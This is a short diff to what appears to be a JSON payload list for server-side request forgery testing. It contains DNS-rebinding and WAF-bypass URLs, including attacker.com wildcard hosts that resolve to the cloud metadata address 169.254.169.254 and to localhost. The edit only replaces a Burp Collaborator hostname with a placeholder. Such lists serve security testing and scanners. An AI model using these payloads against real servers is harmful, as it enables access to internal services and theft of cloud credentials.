@@ -60,7 +60,7 @@
       "description": "DNS rebinding and time-of-check bypass payloads",
       "payloads": [
         {"payload": "http://make-<random>.1u.ms/", "description": "1u.ms DNS rebind service (resolves to 127.0.0.1 after first response)", "waf_bypass": true},
-        {"payload": "http://<collaborator-id>.burpcollaborator.net/", "description": "Burp Collaborator for SSRF OOB detection", "waf_bypass": false},
+        {"payload": "http://COLLABORATOR_URL/", "description": "Burp Collaborator for SSRF OOB detection — replace COLLABORATOR_URL with output of generate_collaborator_payload()", "waf_bypass": false},
         {"payload": "http://169.254.169.254.attacker.com/", "description": "DNS wildcard resolving to metadata IP", "waf_bypass": true},
         {"payload": "http://127.0.0.1.attacker.com/", "description": "DNS wildcard resolving to localhost", "waf_bypass": true}
       ]
